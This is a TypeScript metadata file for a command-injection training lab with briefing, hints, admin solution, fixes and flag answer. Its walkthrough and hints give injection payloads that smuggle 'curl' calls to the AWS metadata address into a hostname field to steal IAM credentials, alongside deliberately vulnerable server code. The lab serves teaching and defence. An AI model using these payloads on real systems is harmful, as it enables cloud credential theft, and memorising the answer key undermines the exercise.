// src/modules/practice-labs/command-injection/labs/lab4/lab4.metadata.ts
import type { LabMetadata } from '../../../types/lab-metadata.type';

export const cmdLab4Metadata: LabMetadata = {
  slug: 'cmdi-api-cloud-provisioning-hostname',
  title: 'Command Injection: API Parameter — Cloud Server Provisioning',
  ar_title: 'حقن الأوامر: معامل API — توفير الخادم السحابي',
  description:
    'Exploit a command injection vulnerability in a cloud infrastructure provisioning API where the server hostname parameter is used in a shell script. Chain multiple commands to read cloud instance metadata, IAM credentials, and ultimately exfiltrate AWS access keys.',
  ar_description:
    'استغل ثغرة حقن أوامر في API توفير البنية التحتية السحابية حيث يُستخدم معامل hostname الخادم في سكريبت shell. سلسل أوامر متعددة لقراءة بيانات تعريف instance السحابية وبيانات IAM وسرب مفاتيح AWS.',
  difficulty: 'ADVANCED',
  category: 'WEB_SECURITY',
  skills: [
    'Command Injection',
    'Cloud Security',
    'AWS Metadata Attack',
    'IAM Credential Theft',
    'API Security',
  ],
  xpReward: 350,
  pointsReward: 175,
  duration: 60,
  executionMode: 'SHARED_BACKEND',
  isPublished: true,

  // ─── للمتدرب ────────────────────────────────────────────────────
  goal: 'Inject commands into the server provisioning hostname parameter to: 1) confirm RCE, 2) read AWS instance metadata at 169.254.169.254, 3) extract IAM temporary credentials containing the flag.',
  ar_goal:
    'احقن أوامر في معامل hostname لتوفير الخادم لـ: 1) تأكيد RCE، 2) قراءة بيانات AWS instance على 169.254.169.254، 3) استخراج بيانات IAM المؤقتة التي تحتوي على العلم.',

  briefing: {
    en: `CloudForge — cloud infrastructure platform. Provision servers with one API call.
POST /servers/provision { "hostname": "web-01", "region": "us-east-1", "size": "t3.medium" }
Response: { "jobId": "job_xyz", "status": "provisioning" }
The backend: exec("./provision.sh --hostname web-01 --region us-east-1 --size t3.medium")
Your hostname. In a shell script.
No quotes. No escaping.
You're on an EC2 instance.
Every EC2 instance has the metadata service.
169.254.169.254.
A link-local IP. Accessible only from within the instance.
It contains everything: instance ID, region, IAM role credentials.
The IAM role: CloudForgeRole.
It has: S3 full access. EC2 full access. RDS full access.
Temporary credentials: AccessKeyId, SecretAccessKey, SessionToken.
Refreshed every hour.
They're at: 169.254.169.254/latest/meta-data/iam/security-credentials/CloudForgeRole
You can't reach that URL from outside.
But the server can.
And you control the server's shell.`,
    ar: `CloudForge — منصة بنية تحتية سحابية. وفِّر خوادم بنداء API واحد.
POST /servers/provision { "hostname": "web-01"، "region": "us-east-1"، "size": "t3.medium" }
الاستجابة: { "jobId": "job_xyz"، "status": "provisioning" }
الـ backend: exec("./provision.sh --hostname web-01 --region us-east-1 --size t3.medium")
hostname الخاص بك. في سكريبت shell.
بدون اقتباسات. بدون escape.
أنت على EC2 instance.
كل EC2 instance لديه خدمة metadata.
169.254.169.254.
IP محلي للرابط. متاح فقط من داخل الـ instance.
يحتوي على كل شيء: معرّف الـ instance، المنطقة، بيانات اعتماد IAM role.
دور IAM: CloudForgeRole.
لديه: وصول كامل لـ S3. وصول كامل لـ EC2. وصول كامل لـ RDS.
بيانات اعتماد مؤقتة: AccessKeyId، SecretAccessKey، SessionToken.
تُحدَّث كل ساعة.
موجودة في: 169.254.169.254/latest/meta-data/iam/security-credentials/CloudForgeRole
لا يمكنك الوصول لتلك URL من الخارج.
لكن الخادم يستطيع.
وأنت تتحكم في شيل الخادم.`,
  },

  stepsOverview: {
    en: [
      'POST /servers/provision { "hostname": "web-01; whoami" } — confirm RCE: username in response/logs',
      'Probe IMDS: { "hostname": "web-01; curl http://169.254.169.254/latest/meta-data/" } — confirm link-local metadata access',
      'Get IAM role name: { "hostname": "web-01; curl http://169.254.169.254/latest/meta-data/iam/security-credentials/" } → "CloudForgeRole"',
      'Exfiltrate IAM credentials: { "hostname": "web-01; curl http://169.254.169.254/latest/meta-data/iam/security-credentials/CloudForgeRole" }',
      'Response contains AccessKeyId, SecretAccessKey, SessionToken, and the FLAG',
    ],
    ar: [
      'POST /servers/provision { "hostname": "web-01; whoami" } — أكّد RCE: اسم المستخدم في الاستجابة/السجلات',
      'استعرض IMDS: { "hostname": "web-01; curl http://169.254.169.254/latest/meta-data/" } — أكّد وصول metadata محلي الرابط',
      'احصل على اسم IAM role: { "hostname": "web-01; curl http://169.254.169.254/latest/meta-data/iam/security-credentials/" } → "CloudForgeRole"',
      'سرب بيانات IAM: { "hostname": "web-01; curl http://169.254.169.254/latest/meta-data/iam/security-credentials/CloudForgeRole" }',
      'الاستجابة تحتوي على AccessKeyId وSecretAccessKey وSessionToken والـ FLAG',
    ],
  },

  // ─── للأدمن فقط ─────────────────────────────────────────────────
  solution: {
    context:
      'CloudForge /servers/provision injects the "hostname" parameter into a shell script: exec("./provision.sh --hostname " + hostname + " --region " + region). No sanitization. The server runs on an AWS EC2 instance with an IAM role (CloudForgeRole) attached. The AWS IMDS (Instance Metadata Service) at 169.254.169.254 is accessible from within the instance and provides temporary IAM credentials. RCE + IMDS = full AWS credential theft.',
    vulnerableCode:
      '// Server provisioning (vulnerable):\n' +
      "app.post('/servers/provision', isAuthenticated, async (req, res) => {\n" +
      '  const { hostname, region, size } = req.body;\n' +
      '  // ❌ hostname injected into shell script\n' +
      '  const result = await exec(\n' +
      '    `./provision.sh --hostname ${hostname} --region ${region} --size ${size}`\n' +
      '  );\n' +
      "  res.json({ jobId: generateJobId(), status: 'provisioning' });\n" +
      '});',
    exploitation:
      '1. POST /servers/provision { "hostname": "web-01; whoami" } → RCE confirmed\n' +
      '2. POST /servers/provision { "hostname": "web-01; curl http://169.254.169.254/latest/meta-data/iam/security-credentials/" } → "CloudForgeRole"\n' +
      '3. POST /servers/provision { "hostname": "web-01; curl http://169.254.169.254/latest/meta-data/iam/security-credentials/CloudForgeRole" } → AWS keys + FLAG',
    steps: {
      en: [
        '{ "hostname": "web-01; whoami" } → "ec2-user" or "ubuntu" — RCE confirmed',
        '{ "hostname": "web-01; curl http://169.254.169.254/latest/meta-data/" } → lists metadata paths',
        '{ "hostname": "web-01; curl http://169.254.169.254/latest/meta-data/iam/security-credentials/" } → "CloudForgeRole"',
        '{ "hostname": "web-01; curl http://169.254.169.254/latest/meta-data/iam/security-credentials/CloudForgeRole" } → { "AccessKeyId": "ASIA_CLOUDFORGE_XYZ789", "SecretAccessKey": "...", "Flag": "FLAG{CMDI_API_CLOUD_PROVISIONING_AWS_IMDS_IAM_THEFT}" }',
      ],
      ar: [
        '{ "hostname": "web-01; whoami" } → "ec2-user" أو "ubuntu" — تأكيد RCE',
        '{ "hostname": "web-01; curl http://169.254.169.254/latest/meta-data/" } → يعرض مسارات metadata',
        '{ "hostname": "web-01; curl http://169.254.169.254/latest/meta-data/iam/security-credentials/" } → "CloudForgeRole"',
        '{ "hostname": "web-01; curl http://169.254.169.254/latest/meta-data/iam/security-credentials/CloudForgeRole" } → { "AccessKeyId": "ASIA_CLOUDFORGE_XYZ789"، "SecretAccessKey": "..."، "Flag": "FLAG{CMDI_API_CLOUD_PROVISIONING_AWS_IMDS_IAM_THEFT}" }',
      ],
    },
    fix: [
      'Input validation: hostname must match /^[a-z0-9\\-]{1,63}$/ — strictly enforce at API boundary',
      'Use AWS SDK instead of shell scripts: call EC2 APIs programmatically — no shell invocation needed for provisioning',
      'IMDSv2 enforcement: require session-oriented metadata access (PUT token first) — harder to abuse from injection but still accessible',
      "IMDSv2 + hop limit = 1: set hop-limit=1 to prevent container escape to IMDS; for direct instance injection this doesn't help — the real fix is preventing injection",
      'Least privilege IAM: CloudForgeRole should only have the minimum permissions needed — not S3/EC2/RDS full access',
    ],
  },

  postSolve: {
    explanation: {
      en: "This lab demonstrates the SSRF-meets-CMDI attack chain: command injection on a cloud server provides access to the AWS Instance Metadata Service (IMDS), which is only reachable from within the EC2 instance. The IMDS provides temporary IAM role credentials that can be used to authenticate as the instance's IAM role — accessing all AWS services it has permissions for. This exact attack chain was used in the 2019 Capital One breach (100M customers affected).",
      ar: 'يُظهر هذا اللاب سلسلة هجوم SSRF-meets-CMDI: حقن الأوامر على خادم سحابي يوفر الوصول لخدمة AWS Instance Metadata Service (IMDS)، التي يمكن الوصول إليها فقط من داخل EC2 instance. يوفر IMDS بيانات اعتماد IAM role المؤقتة التي يمكن استخدامها للمصادقة بوصفها IAM role الـ instance — للوصول لجميع خدمات AWS التي لديها أذونات لها. سلسلة الهجوم هذه بالضبط استُخدمت في خرق Capital One 2019 (100 مليون عميل متأثر).',
    },
    impact: {
      en: 'AWS IAM credential theft via IMDS: the stolen CloudForgeRole credentials provide full S3 access (all customer data), full EC2 access (spin up/tear down instances, access to all provisioned servers), and full RDS access (all production databases). Credentials are temporary but refresh automatically — giving persistent access as long as the injection point remains. This is one of the highest-impact attack chains in cloud security.',
      ar: 'سرقة بيانات AWS IAM عبر IMDS: بيانات اعتماد CloudForgeRole المسروقة توفر وصولاً كاملاً لـ S3 (كل بيانات العملاء)، وصول كامل لـ EC2 (تشغيل/إيقاف الـ instances، وصول لكل الخوادم المُوفَّرة)، ووصول كامل لـ RDS (جميع قواعد البيانات الإنتاجية). البيانات مؤقتة لكنها تتجدد تلقائياً — مما يمنح وصولاً مستمراً طالما بقيت نقطة الحقن. هذه واحدة من أكثر سلاسل الهجوم تأثيراً في أمان السحابة.',
    },
    fix: [
      'IMDSv2 mandatory: PUT http://169.254.169.254/latest/api/token with TTL → use token header on subsequent requests — SSRF from web apps cannot make PUT requests',
      'Disable IMDS if not needed: aws ec2 modify-instance-metadata-options --http-endpoint disabled',
      'Replace shell scripts with AWS SDK calls: no shell = no injection surface for provisioning operations',
      'Network segmentation: provisioning service should not have internet access or ability to make arbitrary HTTP requests',
    ],
  },

  hints: [
    {
      order: 1,
      xpCost: 25,
      content:
        'The provisioning API runs a shell script with your hostname. Try hostname: "web-01; whoami" to confirm command injection. Does the response or job status include a username?',
    },
    {
      order: 2,
      xpCost: 45,
      content:
        'RCE confirmed! AWS EC2 instances have a special metadata service at the link-local IP 169.254.169.254. This IP is only accessible from within the instance. Try: hostname: "web-01; curl http://169.254.169.254/latest/meta-data/"',
    },
    {
      order: 3,
      xpCost: 70,
      content:
        'GET /latest/meta-data/iam/security-credentials/ returns the IAM role name attached to this instance. Then GET /latest/meta-data/iam/security-credentials/<ROLE_NAME> returns temporary AWS credentials.',
    },
    {
      order: 4,
      xpCost: 100,
      content:
        '{ "hostname": "web-01; curl http://169.254.169.254/latest/meta-data/iam/security-credentials/CloudForgeRole" } — the response JSON contains AccessKeyId, SecretAccessKey, and the flag.',
    },
  ],

  flagAnswer: 'FLAG{CMDI_API_CLOUD_PROVISIONING_AWS_IMDS_IAM_THEFT}',
  initialState: {
    contents: [
      {
        title: 'IMDS_ROOT',
        body: JSON.stringify({
          path: 'http://169.254.169.254/latest/meta-data/',
          content:
            'ami-id\nhostname\niam/\ninstance-id\ninstance-type\nlocal-ipv4\nplacement/\npublic-ipv4',
        }),
        author: 'aws_imds',
        isPublic: false,
      },
      {
        title: 'IMDS_IAM',
        body: JSON.stringify({
          path: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
          content: 'CloudForgeRole',
        }),
        author: 'aws_imds',
        isPublic: false,
      },
      {
        title: 'IMDS_CREDS',
        body: JSON.stringify({
          path: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/CloudForgeRole',
          content: JSON.stringify({
            Code: 'Success',
            Type: 'AWS-HMAC',
            AccessKeyId: 'ASIA_CLOUDFORGE_XYZ789',
            SecretAccessKey: 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',
            Token: 'AQoDYXdzEJr_EXAMPLE_SESSION_TOKEN',
            Expiration: '2026-03-06T06:00:00Z',
            Flag: 'FLAG{CMDI_API_CLOUD_PROVISIONING_AWS_IMDS_IAM_THEFT}',
          }),
        }),
        author: 'aws_imds',
        isPublic: false,
      },
    ],
  },
};
